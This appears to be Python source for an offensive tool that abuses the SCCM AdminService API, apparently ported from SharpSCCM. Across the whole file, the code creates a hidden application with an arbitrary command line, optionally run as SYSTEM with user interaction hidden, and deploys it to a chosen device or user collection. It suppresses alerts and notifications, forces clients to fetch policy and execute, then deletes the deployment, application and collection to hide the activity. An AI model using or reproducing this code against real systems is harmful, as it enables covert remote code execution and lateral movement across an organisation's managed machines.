import requests
import json
import uuid
import time

from datetime import datetime
from requests_ntlm import HttpNtlmAuth
from urllib3.exceptions import InsecureRequestWarning

from lib.logger import logger




#everything here was converted from SharpSCCM...ily @_Mayyhem
class SMSAPPLICATION:

    def __init__(self, username, password, target, logs_dir):
        self.username = username
        self.password = password
        self.target = target
        self.logs_dir = logs_dir
        self.headers = {'Content-Type': 'application/json'}
        
        #created during execution
        self.site_ID = "" 
        self.scope_ID = ""
        self.app_ID = ""
        self.app_CI_ID = ""
        self.deployment_ID = ""
        self.assignment_id = ""
        self.file_ID = ""
        self.collection_name = ""
        self.collection_id = ""
        self.resource_name = ""
        self.site_code = ""
        self.deployment_name = ""
        
        
        #user controlled input
        self.runas_user = ""
        self.path = ""
        self.working_dir = ""
        self.app_name = ""
        self.collection_type = ""
        self.target_resource = ""
        self.class_name = ""

    def jprint(self, obj):
        text = json.dumps(obj, sort_keys=True, indent=4)
        print(text)
    
    def adminservice_post(self, url, body):
        r = requests.post(url,
                    auth=HttpNtlmAuth(self.username, self.password),
                    verify=False,headers=self.headers, json=body) 
        return r

    def adminservice_get(self, url):
        r = requests.get(url,
                auth=HttpNtlmAuth(self.username, self.password),
                verify=False,headers=self.headers)
        return r
    
    def adminservice_delete(self, url):
        r = requests.delete(url,
                auth=HttpNtlmAuth(self.username, self.password),
                verify=False,headers=self.headers)
        return r
    
    def adminservice_patch(self, url, body):
        r = requests.patch(url,
                auth=HttpNtlmAuth(self.username, self.password),
                verify=False,headers=self.headers, json=body)
        return r

    def get_sitecode(self):
        url = f"https://{self.target}/AdminService/wmi/SMS_Site"
        r = self.adminservice_get(url)
        
        if r.status_code == 200:
            response = r.json()
            self.site_code = response['value'][0]['SiteCode']
            return
        else:
            logger.info("[-] Couldn't recover the SiteCode")
            return
        
    def application_xml(self):
        self.app_ID = f"Application_{uuid.uuid4()}"
        self.deployment_ID = f"DeploymentType_{uuid.uuid4()}"
        self.file_ID = f"File_{uuid.uuid4()}"
        logger.info(f"[*] Creating new application: {self.app_ID}")
        logger.info(f"[*] Application path: {self.path}")
        logger.info(f"[*] Updated application to run in the context of {self.runas_user}")
        
        
        xml = f'''<?xml version="1.0" encoding="utf-16"?>
                <AppMgmtDigest xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
                    <Application AuthoringScopeId="{self.scope_ID}" LogicalName="{self.app_ID}" Version="1">
                        <DisplayInfo DefaultLanguage="en-US">
                            <Info Language="en-US">
                                <Title>{self.app_name}</Title>
                                <Publisher/>
                                <Version/>
                            </Info>
                        </DisplayInfo>
                        <DeploymentTypes>
                            <DeploymentType AuthoringScopeId="{self.scope_ID}" LogicalName="{self.deployment_ID}" Version="1"/>
                        </DeploymentTypes>
                        <Title ResourceId="Res_665624387">{self.app_name}</Title>
                        <Description ResourceId="Res_215018014"/>
                        <Publisher ResourceId="Res_433133800"/>
                        <SoftwareVersion ResourceId="Res_486536226"/>
                        <CustomId ResourceId="Res_167409166"/>
                    </Application>
                    <DeploymentType AuthoringScopeId="{self.scope_ID}" LogicalName="{self.deployment_ID}" Version="1">
                        <Title ResourceId="Res_1643586251">{self.app_name}</Title>
                        <Description ResourceId="Res_1438196005"/>
                        <DeploymentTechnology>GLOBAL/ScriptDeploymentTechnology</DeploymentTechnology>
                        <Technology>Script</Technology>
                        <Hosting>Native</Hosting>
                        <Installer Technology="Script">
                            <ExecutionContext>{self.runas_user}</ExecutionContext>
                            <DetectAction>
                                <Provider>Local</Provider>
                                <Args>
                                    <Arg Name="ExecutionContext" Type="String">{self.runas_user}</Arg>
                                    <Arg Name="MethodBody" Type="String">
                                        &lt;?xml version="1.0" encoding="utf-16"?&gt;                                                                                       
                                            &lt;EnhancedDetectionMethod xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"&gt;
                                                &lt;Settings xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest"&gt;
                                                    &lt;File Is64Bit="true" LogicalName="{self.file_ID}" xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration"&gt;
                                                        &lt;Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"&gt;
                                                            &lt;DisplayName Text="" /&gt;
                                                            &lt;Description Text="" /&gt;
                                                        &lt;/Annotation&gt;
                                                        &lt;Path&gt;C:\\&lt;/Path&gt;
                                                        &lt;Filter&gt;asdf&lt;/Filter&gt;
                                                    &lt;/File&gt;
                                                &lt;/Settings&gt;
                                                &lt;Rule id="{self.scope_ID}/{self.deployment_ID}" Severity="Informational" NonCompliantWhenSettingIsNotFound="false" xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules"&gt;
                                                    &lt;Annotation&gt;
                                                        &lt;DisplayName Text="" /&gt;
                                                        &lt;Description Text="" /&gt;
                                                    &lt;/Annotation&gt;
                                                    &lt;Expression&gt;
                                                        &lt;Operator&gt;NotEquals&lt;/Operator&gt;
                                                        &lt;Operands&gt;
                                                            &lt;SettingReference AuthoringScopeId="{self.scope_ID}" LogicalName="{self.app_ID}" Version="1" DataType="Int64" SettingLogicalName="{self.file_ID}" SettingSourceType="File" Method="Count" Changeable="false" /&gt;
                                                            &lt;ConstantValue Value="0" DataType="Int64" /&gt;
                                                        &lt;/Operands&gt;
                                                    &lt;/Expression&gt;
                                                &lt;/Rule&gt;
                                            &lt;/EnhancedDetectionMethod&gt;
                                    </Arg>
                                </Args>
                            </DetectAction>
                            <InstallAction>
                                <Provider>Script</Provider>
                                <Args>
                                    <Arg Name="InstallCommandLine" Type="String">{self.path}</Arg>
                                    <Arg Name="WorkingDirectory" Type="String">{self.working_dir}</Arg>
                                    <Arg Name="ExecutionContext" Type="String">{self.runas_user}</Arg>
                                    <Arg Name="RequiresLogOn" Type="String"/>
                                    <Arg Name="RequiresElevatedRights" Type="Boolean">false</Arg>
                                    <Arg Name="RequiresUserInteraction" Type="Boolean">false</Arg>
                                    <Arg Name="RequiresReboot" Type="Boolean">false</Arg>
                                    <Arg Name="UserInteractionMode" Type="String">Hidden</Arg>
                                    <Arg Name="PostInstallBehavior" Type="String">BasedOnExitCode</Arg>
                                    <Arg Name="ExecuteTime" Type="Int32">0</Arg><Arg Name="MaxExecuteTime" Type="Int32">15</Arg>
                                    <Arg Name="RunAs32Bit" Type="Boolean">false</Arg>
                                    <Arg Name="SuccessExitCodes" Type="Int32[]">
                                        <Item>0</Item>
                                        <Item>1707</Item>
                                    </Arg>
                                    <Arg Name="RebootExitCodes" Type="Int32[]">
                                        <Item>3010</Item>
                                    </Arg>
                                    <Arg Name="HardRebootExitCodes" Type="Int32[]">
                                        <Item>1641</Item>
                                    </Arg>
                                    <Arg Name="FastRetryExitCodes" Type="Int32[]">
                                        <Item>1618</Item>
                                    </Arg>
                                </Args>
                            </InstallAction>
                            <CustomData>
                                <DetectionMethod>Enhanced</DetectionMethod>
                                <EnhancedDetectionMethod>
                                    <Settings xmlns="http://schemas.microsoft.com/SystemCenterConfigurationManager/2009/AppMgmtDigest">
                                        <File xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/07/10/DesiredConfiguration" Is64Bit="true" LogicalName="{self.file_ID}">
                                            <Annotation xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules">
                                                <DisplayName Text=""/>
                                                <Description Text=""/>
                                            </Annotation>
                                            <Path>C:\\</Path>
                                            <Filter>asdf</Filter>
                                        </File>
                                    </Settings>
                                    <Rule xmlns="http://schemas.microsoft.com/SystemsCenterConfigurationManager/2009/06/14/Rules" id="{self.scope_ID}/{self.deployment_ID}" Severity="Informational" NonCompliantWhenSettingIsNotFound="false">
                                        <Annotation>
                                            <DisplayName Text=""/><Description Text=""/>
                                        </Annotation>
                                        <Expression>
                                            <Operator>NotEquals</Operator>
                                            <Operands>
                                                <SettingReference AuthoringScopeId="{self.scope_ID}" LogicalName="{self.app_ID}" Version="1" DataType="Int64" SettingLogicalName="{self.file_ID}" SettingSourceType="File" Method="Count" Changeable="false"/>
                                                <ConstantValue Value="0" DataType="Int64"/>
                                            </Operands>
                                        </Expression>
                                    </Rule>
                                </EnhancedDetectionMethod>
                                <InstallCommandLine>{self.path}</InstallCommandLine>
                                <UninstallSetting>SameAsInstall</UninstallSetting>
                                <InstallFolder/>
                                <UninstallCommandLine/>
                                <UninstallFolder/>
                                <MaxExecuteTime>15</MaxExecuteTime>
                                <ExitCodes>
                                    <ExitCode Code="0" Class="Success"/>
                                    <ExitCode Code="1707" Class="Success"/>
                                    <ExitCode Code="3010" Class="SoftReboot"/>
                                    <ExitCode Code="1641" Class="HardReboot"/>
                                    <ExitCode Code="1618" Class="FastRetry"/>
                                </ExitCodes>
                                <UserInteractionMode>Hidden</UserInteractionMode>
                                <AllowUninstall>true</AllowUninstall>
                            </CustomData>
                        </Installer>
                    </DeploymentType>
                </AppMgmtDigest>
                '''
        return xml
        
    def get_siteid(self):
        url = f"https://{self.target}/AdminService/wmi/SMS_Identification.GetSiteID"
        try:
            r = self.adminservice_get(url)
            if r.status_code == 201:
                result=r.json()
                site_ID = result.get("SiteID", "")
                self.site_ID = site_ID.replace("{", "").replace("}", "")
                self.scope_ID = f"ScopeId_{self.site_ID}"
            else:
                logger.info("[-] Something went wrong when requesting the site ID.")
                logger.info(r.status_code)
                logger.info(r.content)
        except Exception as e:
            logger.info(e)
            
            
    def add_application(self, xml):

        url = f"https://{self.target}/AdminService/wmi/SMS_Application"

        body = {"SDMPackageXML": xml,
                "IsHidden": True
        }
        
        r = self.adminservice_post(url, body)   
        if r.status_code == 201:
            logger.info(f"[*] Successfully created application")
            response = r.json()
            self.app_CI_ID = response.get("CI_ID")
            return True
        else:
            return False
        
    def check_if_application_exists(self):
        logger.info("[*] Checking if application already exists")
        url = f"https://{self.target}/AdminService/wmi/SMS_Application?$filter=LocalizedDisplayName eq '{self.app_name}'"
        r = self.adminservice_get(url)
        #need some logic to get content length results or something
        # sys.exit()
    
    def new_application(self):
        is_name_used = self.check_if_application_exists()   
        if is_name_used:
            logger.info("[-] Application is already in use. Try a different name")
            return False

        self.get_siteid()
       
        if not self.scope_ID:
            return False
        
        xml = self.application_xml()

        if not xml:
            return False

        return self.add_application(xml)


    def new_collection(self):
        if not self.validate_resource_id():
            return False
        if not self.add_collection():
            return False
        if not self.add_collection_member():
            return False
        if not self.validated_collection_membership():
            return False
        return True
    
    
    def add_collection(self):
        if self.collection_type == "device":
            collection_type = 2
            limit_collection = "SMS00001"
        else:
            collection_type = 1
            limit_collection = "SMS00002"
        
        self.collection_name = f"{self.collection_type}_{uuid.uuid4()}"
        logger.info(f"[*] Creating new {self.collection_type} collection: {self.collection_name}")
        
        url = f"https://{self.target}/AdminService/wmi/SMS_Collection"
        
        body = {
            "Name": self.collection_name,
            "LimitToCollectionID": limit_collection,
            "Comment": "",
            "CollectionType": collection_type
        }
        
        r = self.adminservice_post(url, body)
        if r.status_code == 201:
            logger.info("[+] Successfully created collection")
            response = r.json()
            self.collection_id = response.get("CollectionID")
            return True
    

    def add_collection_member(self):
        url = f"https://{self.target}/AdminService/wmi/SMS_Collection('{self.collection_id}')/AdminService.AddMembershipRule"
        
        body = {
        "collectionRule": {
            "@odata.type": "#AdminService.SMS_CollectionRuleDirect",
            "ResourceClassName": self.class_name,
            "RuleName": f"{self.collection_type}_{uuid.uuid4()}",
            "ResourceID": int(self.target_resource)
            }
        }
        r = self.adminservice_post(url, body)
        
        if r.status_code == 201:
            logger.info(f"[+] Added {self.resource_name} {self.target_resource} to {self.collection_name}")
            return True
        else:
            return False
        
    def validated_collection_membership(self):
        logger.info("[*] Waiting for new collection member to become available")
        time.sleep(5)
        
        url = f"https://{self.target}/AdminService/wmi/SMS_FullCollectionMembership?$filter=CollectionID eq '{self.collection_id}'"
        member_available = False
        while not member_available:
            r = self.adminservice_get(url)

            if r.status_code == 200:
                response = r.json()
                count = len(response.get('value', []))
                if count > 0:
                    member_available = True
                    logger.info(f"[+] Successfully added {self.resource_name} {self.target_resource} to {self.collection_name}")
                    return True
            logger.info("[*] New collection member is not available yet... trying again in 5 seconds")
            time.sleep(5)
    
    def validate_resource_id(self): #make sure the resource the user supplied actually exists
        if self.collection_type == "user":
            class_name = "SMS_R_User"
            url = f"https://{self.target}/AdminService/wmi/SMS_R_User({self.target_resource})"
        else:
            class_name = "SMS_R_System"
            url = f"https://{self.target}/AdminService/wmi/SMS_R_System({self.target_resource})"
        
        r = self.adminservice_get(url)
        if r.status_code == 200:
            self.class_name = class_name
            return True
        elif r.status_code == 404:
            logger.info(f"[-] Resource with ResourceID {self.target_resource}. Check your target resource id argument.")
            return False



    def new_deployment(self):
        logger.info(f"[+] Creating new deployment of {self.app_name} to {self.collection_name} ({self.collection_id})")
        url = f"https://{self.target}/AdminService/wmi/SMS_ApplicationAssignment"
        now = datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ")
        
        if not self.site_code:
            self.get_sitecode()
        
        self.deployment_name = f"{self.app_name}_{self.collection_id}_Install"

        body = {"ApplicationName": self.app_name,
                "AssignmentName": self.deployment_name,
                "AssignmentAction" : 2,
                "AssignedCIs": [int(self.app_CI_ID)],
                "AssignmentType": 2,
                "CollectionName": self.collection_name,
                "DesiredConfigType": 1,
                "DisableMomAlerts": True,
                "EnforcementDeadline": now,
                "LogComplianceToWinEvent": False,
                "NotifyUser": False,
                "OfferFlags": 1,
                "OfferTypeID": 0,
                "OverrideServiceWindows": True,
                "Priority": 2,
                "RebootOutsideOfServiceWindows": False,
                "SoftDeadlineEnabled": True,
                "SourceSite": self.site_code,
                "StartTime": now,
                "SuppressReboot": 0,
                "TargetCollectionID": self.collection_id,
                "UseGMTTimes": True,
                "UserUIExperience": False,
                "WoLEnabled": False
        }
        
        r = self.adminservice_post(url, body)
        if r.status_code == 201:
            response = r.json()
            self.assignment_id = response.get("AssignmentID")
            logger.info(f"[+] Successfully created deployment of {self.app_name} to {self.collection_name} ({self.collection_id})")
            logger.info(f"[*] New deployment name: {self.deployment_name}")
            return True
            
        else:
            return False
        
    def is_deployment_ready(self):
        logger.info("[*] Waiting for new deployment to become available...")
        url = f"https://{self.target}/AdminService/wmi/SMS_ApplicationAssignment?$filter=AssignmentName eq '{self.deployment_name}'"
        time.sleep(5)
        
        deployment_available = False
        while not deployment_available:
            r = self.adminservice_get(url)

            if r.status_code == 200:
                response = r.json()
                count = len(response.get('value', []))
                if count > 0:
                    deployment_available = True
                    logger.info(f"[+] New deployment is available, waiting 30 seconds for updated policy to become available")
                    time.sleep(30)
                    return True
            logger.info("[*] New deployment is not available yet... trying again in 5 seconds")
            time.sleep(5)

        return
    
    def force_policy_update(self):
        url = f"https://{self.target}/AdminService/wmi/SMS_ClientOperation.InitiateClientOperation"
        logger.info(f"[*] Forcing all members of {self.deployment_name} to retrieve machine policy and execute any new applications available")
        if not self.is_deployment_ready():
            return False
        
        body = {
            "Type": 8,
            "TargetCollectionID":self.collection_id,
        }
        r = self.adminservice_post(url, body)
        if r.status_code == 201:
            logger.info("[+] Waiting 1 minute for execution to complete...")
            time.sleep(60)
            return True
        else:
            return False
        

    
    def cleanup(self):
        logger.info("[*] Cleaning up")
        
        delete_deployment_url = f"https://{self.target}/AdminService/wmi/SMS_ApplicationAssignment/{self.assignment_id}"
        r = self.adminservice_delete(delete_deployment_url)
        if r.status_code == 204:
            logger.info(f"[+] Deleted the {self.deployment_name} deployment")
            time.sleep(5)
        else:
            logger.info(r.status_code)
            logger.info(self.jprint(r.json()))
        
        delete_application_url = f"https://{self.target}/AdminService/wmi/SMS_Application({self.app_CI_ID})"
        expire_application_url = f"{delete_application_url}/AdminService.SetIsExpired"
        body = {
            "Expired": True
        }
        
        retire = self.adminservice_post(expire_application_url, body)
        if retire.status_code == 201:
            r = self.adminservice_delete(delete_application_url)
            if r.status_code == 204:
                logger.info(f"[+] Deleted the {self.app_name} application")
                time.sleep(5)    
            else:
                logger.info(r.status_code)
                logger.info(self.jprint(r.json()))

            
        delete_collection_url =  f"https://{self.target}/AdminService/wmi/SMS_Collection/{self.collection_id})"
        
        r = self.adminservice_delete(delete_collection_url)
        if r.status_code == 204:
            logger.info(f"[+] Deleted the {self.collection_name} collection")
        
        logger.info("[+] Completed execution")
        return
        
        
    def run(self, path, runas_user, name, collection_type, target_resource, working_dir=""):
        if runas_user == False:
            self.runas_user = "User"
        else:
            self.runas_user = "System"
        
        self.collection_type = collection_type
        self.path = path
        self.working_dir = working_dir
        self.app_name = name
        self.target_resource = target_resource

        if not self.new_collection():
            return
        
        if not self.new_application():
            return
        
        if not self.new_deployment():
            return
        
        if not self.force_policy_update():
            return
    
        self.cleanup()
        return